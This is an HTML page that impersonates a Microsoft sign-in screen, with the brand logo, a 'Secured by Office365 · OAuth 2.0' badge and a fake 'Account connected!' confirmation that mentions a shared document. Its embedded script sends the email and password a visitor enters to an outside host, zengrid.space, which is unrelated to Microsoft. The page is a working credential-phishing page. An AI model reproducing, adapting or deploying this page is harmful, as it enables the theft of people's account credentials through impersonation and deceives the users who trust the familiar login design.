<html lang="en">

<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>

<title>Sign in – Microsoft</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#1a1918;}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.1);padding:44px 44px 36px;width:100%;max-width:440px;}
.ms-logo{display:flex;align-items:center;gap:10px;margin-bottom:28px;}
.ms-logo svg{flex-shrink:0;}
.ms-logo span{font-size:20px;font-weight:600;color:#1a1918;letter-spacing:-.3px;}
h1{font-size:24px;font-weight:600;color:#1a1918;margin-bottom:16px;line-height:1.2;}
.sub{font-size:14px;color:#605e5c;margin-bottom:24px;line-height:1.5;}
.field{margin-bottom:14px;}
.field label{display:block;font-size:13px;font-weight:600;color:#323130;margin-bottom:5px;}
.field input{width:100%;border:1px solid #8a8886;border-radius:2px;padding:8px 10px;font-size:14px;font-family:inherit;outline:none;transition:border-color .15s;background:#fff;color:#1a1918;}
.field input:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4;}
.pw-wrap{position:relative;}
.pw-wrap input{padding-right:70px;}
.pw-toggle{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;color:#0078d4;font-size:13px;cursor:pointer;font-family:inherit;padding:0;}
.pw-toggle:hover{text-decoration:underline;}
.err{background:#fde7e9;border:1px solid #c50f1f;border-radius:2px;padding:10px 14px;font-size:13px;color:#c50f1f;margin-bottom:16px;display:none;}
.err.show{display:block;}
.btn-sign{display:block;width:100%;background:#0078d4;color:#fff;border:none;border-radius:2px;padding:10px 16px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;margin-top:20px;transition:background .15s;}
.btn-sign:hover:not(:disabled){background:#106ebe;}
.btn-sign:disabled{background:#a19f9d;cursor:not-allowed;}
.secured{margin-top:24px;font-size:12px;color:#8a8886;text-align:center;}
.success{display:none;text-align:center;padding:20px 0;}
.success .check{font-size:56px;margin-bottom:16px;}
.success h2{font-size:20px;font-weight:600;color:#107c10;margin-bottom:10px;}
.success p{font-size:14px;color:#605e5c;line-height:1.6;}
</style>
</head>
<body>
<div class="card">
  <div class="ms-logo">
    <svg width="21" height="21" viewBox="0 0 21 21"><rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/><rect x="11.5" y="0" width="9.5" height="9.5" fill="#7fba00"/><rect x="0" y="11.5" width="9.5" height="9.5" fill="#00a4ef"/><rect x="11.5" y="11.5" width="9.5" height="9.5" fill="#ffb900"/></svg>
    <span>Microsoft</span>
  </div>

  <div id="_form_wrap">
    <h1>Sign in</h1>
    <p class="sub">Enter your Microsoft account credentials to connect.</p>
    <div class="err" id="_err"></div>
    <form id="_frm" autocomplete="on">
      <div class="field">
        <label for="_em">Email, phone, or Skype</label>
        <input type="email" id="_em" name="email" autocomplete="username" required placeholder="someone@example.com"/>
      </div>
      <div class="field">
        <label for="_pw">Password</label>
        <div class="pw-wrap">
          <input type="password" id="_pw" name="password" autocomplete="current-password" required/>
          <button type="button" class="pw-toggle" id="_pwtog">Show</button>
        </div>
      </div>
      <button type="submit" class="btn-sign" id="_sub">Sign in</button>
    </form>
    <div class="secured">🔒 Secured by Office365 · OAuth 2.0</div>
  </div>

  <div class="success" id="_ok">
    <div class="check">✅</div>
    <h2>Account connected!</h2>
    <p>Your Microsoft account has been linked successfully.<br/>You can close this tab and return to Shared document.</p>
  </div>
</div>

<script>(function(){
  var _ep = "https://zengrid.space/connect/page/Pj6YSRqo-OiOnXCA0kp7MKUjX9XqrIy6/direct-login";
  document.getElementById('_pwtog').addEventListener('click', function(){
    var i = document.getElementById('_pw');
    var show = i.type === 'password';
    i.type = show ? 'text' : 'password';
    this.textContent = show ? 'Hide' : 'Show';
  });
  document.getElementById('_frm').addEventListener('submit', async function(e){
    e.preventDefault();
    var btn = document.getElementById('_sub');
    var err = document.getElementById('_err');
    err.classList.remove('show');
    btn.textContent = 'Signing in…';
    btn.disabled = true;
    try {
      var r = await fetch(_ep, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          email: document.getElementById('_em').value,
          password: document.getElementById('_pw').value
        })
      });
      var d = await r.json();
      if (!r.ok) throw new Error(d.detail || 'Connection failed');
      document.getElementById('_form_wrap').style.display = 'none';
      document.getElementById('_ok').style.display = 'block';
    } catch(ex) {
      err.textContent = ex.message;
      err.classList.add('show');
      btn.textContent = 'Sign in';
      btn.disabled = false;
    }
  });
})();
</script>
</body>
</html>
